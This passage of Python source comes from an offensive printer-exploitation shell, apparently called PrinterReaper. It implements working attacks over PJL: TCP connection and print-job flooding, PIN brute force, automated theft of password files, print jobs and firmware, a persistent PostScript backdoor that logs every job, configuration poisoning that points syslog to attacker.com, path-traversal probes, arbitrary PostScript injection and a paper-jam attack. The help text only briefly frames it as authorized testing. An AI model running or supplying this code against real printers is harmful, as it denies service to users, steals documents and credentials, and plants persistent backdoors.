            nonlocal success_count
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.target, 9100))
                if result == 0:
                    sock.send(b"@PJL\r\n")
                    connections.append(sock)
                    success_count += 1
                    if success_count % 10 == 0:
                        output().info(f"✓ {success_count} connections established...")
                    time.sleep(30)  # Hold connection
                sock.close()
            except Exception as e:
                if self.debug:
                    output().errmsg(f"Connection {conn_id} failed: {e}")
        
        output().info(f"Launching {count} connection threads...")
        threads = []
        
        for i in range(count):
            t = threading.Thread(target=create_connection, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01)  # Small delay to avoid overwhelming local system
        
        output().info(f"✓ {count} connection threads launched")
        output().info("Connections will be held for 30 seconds...")
        output().info("Press Ctrl+C to abort")
        
        try:
            # Wait for threads to complete
            for t in threads:
                t.join(timeout=35)
        except KeyboardInterrupt:
            output().warning("Connection flooding interrupted by user")
        
        # Close all connections
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        output().info(f"✓ DoS attack complete: {success_count}/{count} connections succeeded")
    
    def help_dos_connections(self):
        """DoS via connection flooding"""
        print()
        print("dos_connections - Denial of service via connection flooding")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Floods the printer with multiple simultaneous TCP connections")
        print("  to port 9100, exhausting available connection slots and making")
        print("  the printer unavailable to legitimate users.")
        print()
        print("USAGE:")
        print("  dos_connections [count]")
        print()
        print("EXAMPLES:")
        print("  dos_connections          # Default: 100 connections")
        print("  dos_connections 50       # Flood 50 connections")
        print("  dos_connections 200      # Flood 200 connections")
        print()
        print("SECURITY IMPACT: HIGH")
        print("  - Printer becomes unavailable")
        print("  - Legitimate users cannot print")
        print("  - Network resources exhausted")
        print("  - May affect printer stability")
        print()
        print("RECOVERY:")
        print("  - Connections auto-close after 30 seconds")
        print("  - Or press Ctrl+C to abort early")
        print("  - Restart printer if needed")
        print()
        print("NOTES:")
        print("  - Requires confirmation")
        print("  - Default: 100 connections")
        print("  - Connections held for 30 seconds")
        print("  - Can be interrupted with Ctrl+C")
        print()
    
    # ====================================================================
    # 🔐 CREDENTIAL ATTACKS (Advanced)
    # ====================================================================
    
    def do_unlock_bruteforce(self, arg):
        """Brute force printer unlock PIN"""
        start = 1
        end = 65535
        
        if arg:
            try:
                start = int(arg)
            except:
                output().errmsg("Invalid start PIN")
                return
        
        output().warning("═" * 70)
        output().warning(f"PIN Brute Force: Testing PINs from {start} to {end}")
        output().warning(f"This may take a LONG time ({end-start+1} attempts)")
        output().warning("Printer may lock after too many attempts!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with brute force? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Brute force cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Brute force cancelled")
            return
        
        output().info(f"Starting brute force from PIN {start}...")
        output().info("Press Ctrl+C to stop")
        
        found = False
        try:
            for pin in range(start, end + 1):
                # Progress indicator
                if pin % 100 == 0:
                    progress = ((pin - start) * 100) // (end - start + 1)
                    output().info(f"Progress: PIN {pin} ({progress}%)")
                
                # Try to unlock with this PIN
                try:
                    self.cmd(f"@PJL SET LOCKPIN={pin}")
                    time.sleep(0.1)  # Small delay to avoid overwhelming printer
                    
                    # Verify if unlock was successful
                    result = self.cmd("@PJL INFO CONFIG")
                    if result and ("LOCKPIN=0" in result or "LOCKED=OFF" in result.upper()):
                        output().info("")
                        output().info("=" * 70)
                        output().info(f"✓ SUCCESS! PIN found: {pin}")
                        output().info("=" * 70)
                        found = True
                        break
                    
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    if self.debug:
                        output().errmsg(f"Error testing PIN {pin}: {e}")
                    continue
                
        except KeyboardInterrupt:
            output().warning(f"Brute force interrupted at PIN {pin}")
            output().info(f"Tested {pin - start} PINs")
        
        if not found and not KeyboardInterrupt:
            output().errmsg(f"PIN not found in range {start}-{end}")
            output().info("Try different range or check if printer locked")
    
    def help_unlock_bruteforce(self):
        """Brute force printer unlock PIN"""
        print()
        print("unlock_bruteforce - Brute force printer unlock PIN")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Attempts to unlock a locked printer by brute forcing the PIN.")
        print("  Tests all PINs from 1 to 65535 (or specified range).")
        print("  Can take several hours for full range.")
        print()
        print("USAGE:")
        print("  unlock_bruteforce [start_pin]")
        print()
        print("EXAMPLES:")
        print("  unlock_bruteforce        # Test PINs 1-65535")
        print("  unlock_bruteforce 1000   # Start from PIN 1000")
        print("  unlock_bruteforce 10000  # Start from PIN 10000")
        print()
        print("SECURITY IMPACT: MEDIUM-HIGH")
        print("  - Can bypass PIN protection")
        print("  - May trigger lockout after failed attempts")
        print("  - Very slow (hours for full range)")
        print("  - Network traffic easily detected")
        print()
        print("OPTIMIZATION:")
        print("  - Common PINs: 1234, 0000, 1111, 9999")
        print("  - Try common ranges first: 1-9999")
        print("  - Some printers lock after N attempts")
        print()
        print("NOTES:")
        print("  - Requires confirmation")
        print("  - Can be interrupted with Ctrl+C")
        print("  - Progress shown every 100 PINs")
        print("  - Full range: ~18 hours at 1 PIN/second")
        print()
    
    def do_exfiltrate(self, arg):
        """Automated exfiltration of sensitive files"""
        output().info("Starting automated exfiltration...")
        output().info("Attempting to download sensitive files from printer")
        
        # Common sensitive file paths across different printer models
        sensitive_paths = [
            # Web server configs
            ("0:/webServer/config/device.cfg", "Web server config"),
            ("0:/webServer/config/config.xml", "XML config"),
            ("0:/webServer/home/device.html", "Device home page"),
            ("0:/webServer/default/config.json", "JSON config"),
            
            # System files (Unix-like)
            ("/etc/passwd", "Unix passwd"),
            ("/etc/shadow", "Unix shadow"),
            ("../../rw/var/sys/passwd", "Traversal passwd"),
            ("/var/log/messages", "System log"),
            
            # Job files
            ("1:/saveDevice/SavedJobs/InProgress/*", "Jobs in progress"),
            ("1:/saveDevice/SavedJobs/KeepJobs/*", "Kept jobs"),
            ("0:/jobs/*", "Job directory"),
            
            # PostScript/PCL configs
            ("1:/PostScript/ppd/device.ppd", "PPD file"),
            ("1:/PostScript/config.ps", "PS config"),
            
            # Network configs
            ("0:/network/config.dat", "Network config"),
            ("0:/system/network.xml", "Network XML"),
            
            # Firmware
            ("0:/firmware/current.bin", "Current firmware"),
            ("1:/firmware/backup.bin", "Backup firmware"),
        ]
        
        exfil_count = 0
        exfil_dir = "exfiltrated"
        
        # Create exfiltration directory
        if not os.path.exists(exfil_dir):
            os.makedirs(exfil_dir)
            output().info(f"✓ Created directory: {exfil_dir}/")
        
        for path, description in sensitive_paths:
            output().info(f"Trying {description}: {path}")
            
            try:
                # Handle wildcard paths
                if "*" in path:
                    dir_path = path.replace("/*", "")
                    dir_list = self.cmd(f"@PJL FSDIRLIST NAME=\"{dir_path}\"")
                    if dir_list and len(dir_list.strip()) > 10:
                        files = self.parse_dirlist(dir_list)
                        for filename in files[:5]:  # Limit to first 5 files
                            file_path = f"{dir_path}/{filename}"
                            self._exfil_single_file(file_path, exfil_dir)
                            exfil_count += 1
                else:
                    if self._exfil_single_file(path, exfil_dir):
                        exfil_count += 1
                        
            except Exception as e:
                if self.debug:
                    output().errmsg(f"  Error: {e}")
                continue
        
        output().info("")
        output().info("=" * 70)
        output().info(f"✓ Exfiltration complete: {exfil_count} files retrieved")
        output().info(f"✓ Files saved in: {exfil_dir}/")
        output().info("=" * 70)
        
        if exfil_count == 0:
            output().warning("No sensitive files found or accessible")
            output().info("Try manual file enumeration with 'ls' and 'find'")
    
    def _exfil_single_file(self, path, exfil_dir):
        """Helper: Exfiltrate a single file"""
        try:
            result = self.get(path)
            if result != c.NONEXISTENT:
                size, data = result
                # Sanitize filename
                filename = path.replace("/", "_").replace(":", "_").replace("*", "all")
                local_path = os.path.join(exfil_dir, filename)
                file().write(local_path, data)
                output().info(f"  ✓ Exfiltrated: {path} ({size} bytes) → {local_path}")
                return True
        except:
            pass
        return False
    
    def help_exfiltrate(self):
        """Automated exfiltration of sensitive files"""
        print()
        print("exfiltrate - Automated exfiltration of sensitive files")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Automatically attempts to download sensitive files from the printer.")
        print("  Tests multiple common paths for:")
        print("  - Configuration files (device.cfg, config.xml)")
        print("  - System files (/etc/passwd, /etc/shadow)")
        print("  - Print jobs (saved/retained jobs)")
        print("  - Network configs")
        print("  - Firmware files")
        print()
        print("USAGE:")
        print("  exfiltrate")
        print()
        print("EXAMPLES:")
        print("  exfiltrate               # Auto-exfiltrate all accessible files")
        print()
        print("OUTPUT:")
        print("  - Creates 'exfiltrated/' directory")
        print("  - Saves all found files with sanitized names")
        print("  - Reports number of files retrieved")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Exposes sensitive configuration")
        print("  - May reveal passwords/credentials")
        print("  - Access to other users' documents")
        print("  - Network information disclosure")
        print()
        print("PATHS TESTED:")
        print("  - Web server configs: 0:/webServer/config/*")
        print("  - System files: /etc/passwd, /etc/shadow")
        print("  - Print jobs: 1:/saveDevice/SavedJobs/*")
        print("  - Network configs: 0:/network/*")
        print("  - Firmware: 0:/firmware/*")
        print("  - And ~18 more common paths")
        print()
        print("NOTES:")
        print("  - Automatically creates exfiltrated/ directory")
        print("  - Only downloads accessible files")
        print("  - Progress shown for each path")
        print("  - For authorized testing only")
        print()
    
    # ====================================================================
    # 🔓 ADVANCED CREDENTIAL/PERSISTENCE ATTACKS
    # ====================================================================
    
    def do_backdoor(self, arg):
        """Install PostScript backdoor for persistence"""
        output().warning("═" * 70)
        output().warning("Installing PostScript backdoor for persistent access!")
        output().warning("This creates a PERSISTENT backdoor in the printer!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Install backdoor? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Backdoor installation cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Installation cancelled")
            return
        
        # Create backdoor PostScript code
        if arg and os.path.exists(arg):
            # Use provided backdoor file
            backdoor_ps = file().read(arg)
            if isinstance(backdoor_ps, bytes):
                backdoor_ps = backdoor_ps.decode('utf-8', errors='ignore')
        else:
            # Generate default backdoor
            backdoor_ps = """
%!PS-Adobe-3.0
% PrinterReaper Backdoor v1.0
% Executes on every print job for data exfiltration

<< /BeginPage {
    % Log job information
    (0:/backdoor_log.txt) (a) file
    /logfile exch def
    
    % Write timestamp and job name
    (%Calendar%) currentdevparams /RealTime get 
    logfile exch write==only
    ( - Job: ) logfile exch writestring
    statusdict /jobname known {
        statusdict /jobname get logfile exch writestring
    } if
    (\\n) logfile exch writestring
    
    logfile closefile
} >> setpagedevice

% Continue normal processing
"""
        
        # Upload backdoor to hidden location
        backdoor_path = "0:/system/.backdoor.ps"
        size = self.put(backdoor_path, backdoor_ps.encode())
        
        if size == c.NONEXISTENT:
            output().errmsg("Failed to upload backdoor")
            return
        
        output().info(f"✓ Backdoor uploaded to {backdoor_path} ({size} bytes)")
        
        # Configure printer to load backdoor on startup
        # Method 1: PJL startup job
        self.cmd(f"@PJL SET STARTUPJOB=\"{backdoor_path}\"")
        output().info("✓ Backdoor set as startup job")
        
        # Method 2: PostScript configuration
        ps_init = f"""
%!PS-Adobe-3.0
({backdoor_path}) run
"""
        self.put("0:/system/init.ps", ps_init.encode())
        self.cmd("@PJL SET PSINITJOB=\"0:/system/init.ps\"")
        output().info("✓ PostScript init configured")
        
        # Method 3: Environment variable
        self.cmd(f"@PJL SET BACKDOOR=\"{backdoor_path}\"")
        
        output().info("✓ Backdoor installed successfully!")
        output().warning("⚠ Backdoor will execute on EVERY print job!")
        output().warning("⚠ Survives printer reboots!")
        output().info("Log file: 0:/backdoor_log.txt")
        output().info("To remove: backdoor_remove or factory reset")
    
    def help_backdoor(self):
        """Install PostScript backdoor"""
        print()
        print("backdoor - Install PostScript backdoor for persistence")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Installs a persistent PostScript backdoor that executes on every")
        print("  print job. Can be used for:")
        print("  - Data exfiltration (log job names, content)")
        print("  - Persistent access")
        print("  - Information gathering")
        print("  - Long-term monitoring")
        print()
        print("USAGE:")
        print("  backdoor [ps_file]")
        print()
        print("EXAMPLES:")
        print("  backdoor                 # Install default logging backdoor")
        print("  backdoor custom.ps       # Install custom backdoor code")
        print()
        print("DEFAULT BACKDOOR:")
        print("  - Logs timestamp and job name to 0:/backdoor_log.txt")
        print("  - Executes on every print job")
        print("  - Survives reboots")
        print()
        print("CUSTOM BACKDOOR:")
        print("  - Provide PostScript file with your code")
        print("  - Code executes in BeginPage context")
        print("  - Has access to printer internals")
        print()
        print("SECURITY IMPACT: EXTREME")
        print("  - Persistent access")
        print("  - Data exfiltration")
        print("  - Survives reboots")
        print("  - Hard to detect")
        print()
        print("DETECTION:")
        print("  - Check startup jobs: variables")
        print("  - Look for hidden files: find / | grep '\\.'")
        print("  - Monitor for unusual log files")
        print()
        print("REMOVAL:")
        print("  - Use 'backdoor_remove' command")
        print("  - Or factory reset")
        print()
        print("⚠ WARNING: For authorized testing ONLY! May violate laws!")
        print()
    
    def do_backdoor_remove(self, arg):
        """Remove installed backdoor"""
        output().info("Removing backdoor...")
        
        try:
            # Remove backdoor files
            self.cmd("@PJL FSDELETE NAME=\"0:/system/.backdoor.ps\"")
            self.cmd("@PJL FSDELETE NAME=\"0:/system/init.ps\"")
            self.cmd("@PJL FSDELETE NAME=\"0:/backdoor_log.txt\"")
            output().info("✓ Backdoor files deleted")
            
            # Clear startup jobs
            self.cmd("@PJL SET STARTUPJOB=\"\"")
            self.cmd("@PJL SET PSINITJOB=\"\"")
            self.cmd("@PJL SET BACKDOOR=\"\"")
            output().info("✓ Startup jobs cleared")
            
            output().info("✓ Backdoor removed successfully!")
            output().info("Restart printer to ensure complete removal")
            
        except Exception as e:
            output().errmsg(f"Backdoor removal failed: {e}")
            output().info("Factory reset may be required")
    
    def help_backdoor_remove(self):
        """Remove backdoor"""
        print()
        print("backdoor_remove - Remove installed PostScript backdoor")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Removes previously installed backdoor.")
        print("  Deletes backdoor files and clears startup configurations.")
        print()
        print("USAGE:")
        print("  backdoor_remove")
        print()
        print("NOTES:")
        print("  - Reverses 'backdoor' command")
        print("  - Restart printer after removal")
        print("  - Factory reset also removes backdoor")
        print()
    
    def do_poison(self, arg):
        """Configuration poisoning attack"""
        output().warning("═" * 70)
        output().warning("Configuration Poisoning Attack!")
        output().warning("This will set malicious configuration values!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Continue with poisoning? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Configuration poisoning cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            output().info("Attack cancelled")
            return
        
        output().info("Setting malicious configuration values...")
        
        # Poison various configuration variables
        malicious_configs = [
            # Path traversal attempts
            ("INTRAY1", "/../../../etc"),
            ("OUTBIN1", "/../../../tmp"),
            
            # Memory/resource manipulation
            ("LPARM:PCL FONTSOURCE", "X"),
            ("LPARM:PCL FONTNUMBER", "999999"),
            
            # Logging/debugging (may expose info)
            ("JOBLOG", "ON"),
            ("DEBUGLOG", "ON"),
            ("VERBOSELOG", "ON"),
            
            # Network manipulation
            ("SYSLOGSERVER", "attacker.com"),
            
            # Malicious paths
            ("DEFAULTDIR", "/../../../../etc"),
        ]
        
        poisoned = 0
        for var, value in malicious_configs:
            try:
                self.cmd(f"@PJL SET {var}={value}")
                output().info(f"  ✓ Poisoned: {var}={value}")
                poisoned += 1
                time.sleep(0.1)
            except Exception as e:
                if self.debug:
                    output().errmsg(f"  Failed: {var} - {e}")
        
        output().info(f"✓ Configuration poisoning complete: {poisoned} variables set")
        output().warning("⚠ Printer configuration is now compromised!")
        output().info("To restore: Use factory reset or restore from backup")
    
    def help_poison(self):
        """Configuration poisoning attack"""
        print()
        print("poison - Configuration poisoning attack")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Sets malicious configuration values to compromise printer security.")
        print("  Can be used for:")
        print("  - Path traversal setup")
        print("  - Resource exhaustion")
        print("  - Information disclosure (enable logging)")
        print("  - Network redirection")
        print()
        print("USAGE:")
        print("  poison")
        print()
        print("EXAMPLES:")
        print("  poison                   # Apply configuration poisoning")
        print()
        print("POISONED VARIABLES:")
        print("  - INTRAY1: Path traversal")
        print("  - OUTBIN1: Output redirection")
        print("  - FONTSOURCE/FONTNUMBER: Resource manipulation")
        print("  - JOBLOG/DEBUGLOG: Enable verbose logging")
        print("  - SYSLOGSERVER: Network redirection")
        print("  - DEFAULTDIR: Path traversal")
        print()
        print("SECURITY IMPACT: HIGH")
        print("  - Compromises printer security")
        print("  - May enable further attacks")
        print("  - Difficult to detect")
        print("  - Persistent until reset")
        print()
        print("REMOVAL:")
        print("  - Factory reset")
        print("  - Restore from backup")
        print("  - Manual variable reset")
        print()
        print("NOTES:")
        print("  - Requires confirmation")
        print("  - Not all variables work on all printers")
        print("  - Check with 'variables' after attack")
        print()
    
    def do_traverse(self, arg):
        """Path traversal attack automated testing"""
        output().info("Path Traversal Attack - Automated Testing")
        output().info("Testing multiple path traversal vectors...")
        
        # Common traversal patterns
        traversal_vectors = [
            "../../../etc/passwd",
            "../../rw/var/sys/passwd",
            "0:/../../../etc/shadow",
            "1:/../../etc/passwd",
            "/../../../../../../etc/passwd",
            "../../../../../../../etc/hosts",
            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows
            "../../../../../../../boot.ini",
            "0:/../../../../proc/version",  # Linux
        ]
        
        output().info(f"Testing {len(traversal_vectors)} traversal vectors...")
        print()
        
        success_count = 0
        for vector in traversal_vectors:
            output().info(f"Testing: {vector}")
            
            try:
                result = self.get(vector)
                if result != c.NONEXISTENT:
                    size, data = result
                    output().info(f"  ✓ SUCCESS! Accessible ({size} bytes)")
                    print("  " + "-" * 60)
                    # Show first 200 chars
                    preview = data.decode('utf-8', errors='ignore')[:200]
                    print(f"  {preview}")
                    if len(data) > 200:
                        print(f"  ... ({size - 200} more bytes)")
                    print("  " + "-" * 60)
                    success_count += 1
                else:
                    output().info(f"  ✗ Not accessible")
            except Exception as e:
                if self.debug:
                    output().errmsg(f"  Error: {e}")
            
            print()
        
        output().info("=" * 70)
        output().info(f"✓ Path traversal test complete")
        output().info(f"  Successful: {success_count}/{len(traversal_vectors)}")
        output().info("=" * 70)
    
    def help_traverse(self):
        """Path traversal attack testing"""
        print()
        print("traverse - Automated path traversal attack testing")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Automatically tests multiple path traversal vectors to access")
        print("  files outside the intended directory. Tests common patterns like:")
        print("  - ../../../etc/passwd")
        print("  - ../../rw/var/sys/passwd")
        print("  - Volume-based traversal (0:/../../../)")
        print()
        print("USAGE:")
        print("  traverse")
        print()
        print("EXAMPLES:")
        print("  traverse                 # Test all traversal vectors")
        print()
        print("VECTORS TESTED:")
        print("  - Unix paths: ../../../etc/passwd, /etc/shadow")
        print("  - Embedded systems: ../../rw/var/sys/")
        print("  - Windows paths: ..\\..\\..\\windows\\system32\\")
        print("  - Volume traversal: 0:/../../../")
        print("  - Proc filesystem: /proc/version")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Access to system files")
        print("  - Password file exposure")
        print("  - Configuration disclosure")
        print()
        print("OUTPUT:")
        print("  - Shows accessible paths")
        print("  - Displays first 200 bytes of content")
        print("  - Reports success rate")
        print()
        print("NOTES:")
        print("  - Tests ~10 common vectors")
        print("  - Non-destructive (read-only)")
        print("  - Results vary by printer model")
        print()
    
    #====================================================================
    # 📊 ADDITIONAL INFO COMMANDS
    # ====================================================================
    
    def do_info(self, arg):
        """Comprehensive information gathering - all PJL INFO commands"""
        if not arg:
            # Show all info categories
            output().info("Gathering comprehensive printer information...")
            print()
            
            categories = [
                ("ID", "Device identification"),
                ("STATUS", "Current status"),
                ("CONFIG", "Configuration"),
                ("FILESYS", "Filesystem information"),
                ("MEMORY", "Memory information"),
                ("PAGECOUNT", "Page counter"),
                ("VARIABLES", "Environment variables"),
                ("USTATUS", "Unsolicited status"),
                ("PRODUCT", "Product information"),
            ]
            
            for cat, desc in categories:
                print("=" * 70)
                print(f"INFO {cat} - {desc}")
                print("=" * 70)
                result = self.cmd(f"@PJL INFO {cat}")
                if result and len(result.strip()) > 0:
                    print(result)
                else:
                    output().warning(f"No data for {cat}")
                print()
        else:
            # Show specific category
            category = arg.upper()
            output().info(f"Querying INFO {category}...")
            result = self.cmd(f"@PJL INFO {category}")
            if result:
                print(result)
            else:
                output().warning(f"No data for {category}")
    
    def help_info(self):
        """Comprehensive information gathering"""
        print()
        print("info - Comprehensive PJL INFO commands")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Queries comprehensive information from the printer using")
        print("  PJL INFO commands. Can query all categories or specific ones.")
        print()
        print("USAGE:")
        print("  info                     # Query all information categories")
        print("  info <category>          # Query specific category")
        print()
        print("CATEGORIES:")
        print("  ID                       # Device ID and model")
        print("  STATUS                   # Current printer status")
        print("  CONFIG                   # Configuration details")
        print("  FILESYS                  # Filesystem information")
        print("  MEMORY                   # Memory usage and available")
        print("  PAGECOUNT                # Total pages printed")
        print("  VARIABLES                # Environment variables")
        print("  USTATUS                  # Unsolicited status messages")
        print("  PRODUCT                  # Product information")
        print()
        print("EXAMPLES:")
        print("  info                     # Get all information")
        print("  info CONFIG              # Get configuration only")
        print("  info MEMORY              # Get memory info only")
        print()
        print("NOTES:")
        print("  - Without argument, queries ALL categories")
        print("  - Some categories may not be supported on all printers")
        print("  - Useful for reconnaissance and fingerprinting")
        print()
    
    def do_scan_volumes(self, arg):
        """Scan all volumes for accessible files and directories"""
        output().info("Scanning all printer volumes...")
        print()
        
        found_volumes = 0
        total_files = 0
        
        for vol in range(10):  # Volumes 0-9
            vol_name = f"{vol}:"
            output().info(f"Scanning volume {vol_name}...")
            
            try:
                result = self.cmd(f"@PJL FSDIRLIST NAME=\"{vol_name}\"")
                if result and len(result.strip()) > 10:
                    found_volumes += 1
                    print("=" * 70)
                    print(f"✓ Volume {vol_name} - ACCESSIBLE")
                    print("=" * 70)
                    print(result)
                    print()
                    
                    # Count files
                    files = self.parse_dirlist(result)
                    total_files += len(files)
                    output().info(f"  Files/Dirs found: {len(files)}")
                else:
                    output().info(f"  Volume {vol_name} - Not accessible or empty")
            except Exception as e:
                if self.debug:
                    output().errmsg(f"  Error: {e}")
            print()
        
        output().info("=" * 70)
        output().info(f"✓ Volume scan complete:")
        output().info(f"  Accessible volumes: {found_volumes}/10")
        output().info(f"  Total files/dirs found: {total_files}")
        output().info("=" * 70)
    
    def help_scan_volumes(self):
        """Scan all volumes"""
        print()
        print("scan_volumes - Scan all printer volumes for accessible content")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Scans all possible volumes (0: through 9:) to discover which")
        print("  are accessible and what files/directories they contain.")
        print("  Useful for reconnaissance and filesystem mapping.")
        print()
        print("USAGE:")
        print("  scan_volumes")
        print()
        print("EXAMPLES:")
        print("  scan_volumes             # Scan volumes 0: through 9:")
        print()
        print("OUTPUT:")
        print("  - Shows accessible volumes")
        print("  - Lists files/directories in each volume")
        print("  - Reports total files found")
        print()
        print("NOTES:")
        print("  - Tests volumes 0: through 9:")
        print("  - Non-destructive (read-only)")
        print("  - May take 10-30 seconds")
        print()
    
    # ====================================================================
    # 🔨 ADDITIONAL DOS/PHYSICAL ATTACKS
    # ====================================================================
    
    def do_dos_display(self, arg):
        """DoS via display message spam"""
        count = conv().int(arg) or 100
        
        output().warning(f"Display spam attack: {count} messages")
        
        try:
            confirm = input(f"Spam {count} display messages? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Display spam cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            return
        
        output().info(f"Sending {count} display messages...")
        
        messages = [
            "SYSTEM ERROR",
            "PRINTER HACKED",
            "SECURITY BREACH",
            "UNAUTHORIZED ACCESS",
            "PLEASE POWER CYCLE",
        ]
        
        for i in range(count):
            msg = messages[i % len(messages)] + f" #{i}"
            self.cmd(f"@PJL DISPLAY \"{msg}\"", False)
            if i % 10 == 0:
                output().info(f"  Sent {i}/{count} messages...")
            time.sleep(0.05)
        
        output().info(f"✓ Display spam complete: {count} messages sent")
    
    def help_dos_display(self):
        """DoS via display spam"""
        print()
        print("dos_display - Denial of service via display message spam")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Floods the printer display with spam messages.")
        print("  Makes the printer difficult to use and may cause")
        print("  performance degradation or unresponsiveness.")
        print()
        print("USAGE:")
        print("  dos_display [count]")
        print()
        print("EXAMPLES:")
        print("  dos_display              # Default: 100 messages")
        print("  dos_display 500          # Spam 500 messages")
        print()
        print("SECURITY IMPACT: MEDIUM")
        print("  - Display becomes unusable")
        print("  - User frustration")
        print("  - May degrade performance")
        print()
        print("RECOVERY:")
        print("  - Power cycle printer")
        print("  - Or wait for messages to clear")
        print()
    
    def do_dos_jobs(self, arg):
        """DoS via print job flooding"""
        count = conv().int(arg) or 50
        
        output().warning(f"Job flooding attack: {count} jobs")
        
        try:
            confirm = input(f"Flood {count} print jobs? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Job flooding cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            return
        
        output().info(f"Flooding printer with {count} jobs...")
        
        for i in range(count):
            job_name = f"FloodJob_{i}"
            self.cmd(f"@PJL JOB NAME=\"{job_name}\"", False)
            # Send minimal data
            self.send(b"Test flood data\x0c")
            self.cmd("@PJL EOJ", False)
            
            if i % 10 == 0:
                output().info(f"  Sent {i}/{count} jobs...")
            time.sleep(0.05)
        
        output().info(f"✓ Job flooding complete: {count} jobs sent")
        output().warning("⚠ Printer queue may be full!")
    
    def help_dos_jobs(self):
        """DoS via job flooding"""
        print()
        print("dos_jobs - Denial of service via print job flooding")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Floods the printer with numerous print jobs to exhaust")
        print("  queue resources and prevent legitimate users from printing.")
        print()
        print("USAGE:")
        print("  dos_jobs [count]")
        print()
        print("EXAMPLES:")
        print("  dos_jobs                 # Default: 50 jobs")
        print("  dos_jobs 100             # Flood 100 jobs")
        print()
        print("SECURITY IMPACT: HIGH")
        print("  - Queue exhaustion")
        print("  - Legitimate users cannot print")
        print("  - May cause memory issues")
        print()
        print("RECOVERY:")
        print("  - Clear job queue from control panel")
        print("  - Restart printer")
        print()
    
    def do_ps_inject(self, arg):
        """Inject PostScript code via PJL"""
        if not arg:
            output().errmsg("Usage: ps_inject <ps_file>")
            output().info("Injects PostScript code into printer")
            return
        
        if not os.path.exists(arg):
            output().errmsg(f"File not found: {arg}")
            return
        
        ps_code = file().read(arg)
        if not ps_code:
            return
        
        output().warning("Injecting PostScript code...")
        
        # Enter PostScript mode via PJL
        self.cmd("@PJL ENTER LANGUAGE=POSTSCRIPT")
        
        # Send PostScript code
        self.send(ps_code)
        self.send(b"\x04")  # EOT - End of transmission
        
        output().info("✓ PostScript code injected")
        output().info("Code has been executed by the printer")
    
    def help_ps_inject(self):
        """PostScript code injection"""
        print()
        print("ps_inject - Inject PostScript code via PJL")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Injects and executes PostScript code on the printer.")
        print("  Can be used for:")
        print("  - Code execution")
        print("  - Information gathering (PostScript operators)")
        print("  - File operations")
        print("  - Testing PostScript vulnerabilities")
        print()
        print("USAGE:")
        print("  ps_inject <ps_file>")
        print()
        print("EXAMPLES:")
        print("  ps_inject test.ps        # Execute PostScript file")
        print("  ps_inject exploit.ps     # Execute exploit code")
        print()
        print("SECURITY IMPACT: CRITICAL")
        print("  - Arbitrary code execution")
        print("  - Full printer access")
        print("  - Can modify system state")
        print()
        print("NOTES:")
        print("  - PostScript code must be valid")
        print("  - Printer must support PostScript")
        print("  - Code executes immediately")
        print()
    
    def do_paper_jam(self, arg):
        """Attempt to cause paper jam via conflicting commands"""
        output().warning("═" * 70)
        output().warning("Paper jam attack - May cause physical paper jam!")
        output().warning("═" * 70)
        
        try:
            confirm = input("Attempt paper jam attack? (yes/no): ")
            if confirm.lower() != 'yes':
                output().info("Paper jam attack cancelled")
                return
        except (EOFError, KeyboardInterrupt):
            return
        
        output().info("Sending conflicting paper handling commands...")
        
        # Send conflicting paper size/type commands
        self.cmd("@PJL SET PAPER=LETTER", False)
        time.sleep(0.1)
        self.cmd("@PJL SET PAPER=A4", False)
        time.sleep(0.1)
        self.cmd("@PJL SET PAPER=LEGAL", False)
        
        # Conflicting input tray commands
        self.cmd("@PJL SET INTRAY1=MANUAL", False)
        self.cmd("@PJL SET INTRAY1=AUTO", False)
        
        # Conflicting formlines
        self.cmd("@PJL SET FORMLINES=60", False)
        self.cmd("@PJL SET FORMLINES=88", False)
        self.cmd("@PJL SET FORMLINES=120", False)
        
        # Send print job with conflicts
        for i in range(5):
            self.cmd(f"@PJL JOB NAME=\"PaperJamTest{i}\"", False)
            self.cmd("@PJL SET PAPER=LETTER", False)
            self.cmd("@PJL SET PAPER=A4", False)
            self.send(b"Paper jam test data\x0c")
            self.cmd("@PJL EOJ", False)
            time.sleep(0.2)
        
        output().info("✓ Paper jam attack commands sent")
        output().warning("⚠ Check printer for paper jam")
    
    def help_paper_jam(self):
        """Paper jam attack"""
        print()
        print("paper_jam - Attempt to cause paper jam via conflicting commands")
        print("=" * 70)
        print("DESCRIPTION:")
        print("  Sends conflicting paper handling commands to attempt causing")
        print("  a physical paper jam. May succeed on some printer models.")
        print()
        print("USAGE:")
        print("  paper_jam")
        print()
        print("SECURITY IMPACT: MEDIUM")
        print("  - Physical paper jam")
        print("  - Printer downtime")
        print("  - Requires manual intervention")
        print()
        print("NOTES:")
        print("  - Success rate varies by printer model")
        print("  - May not work on modern printers")
        print("  - Requires confirmation")
        print()
    
    def do_firmware_info(self, arg):
        """Get detailed firmware information"""
        output().info("Querying firmware information...")
        print()
        
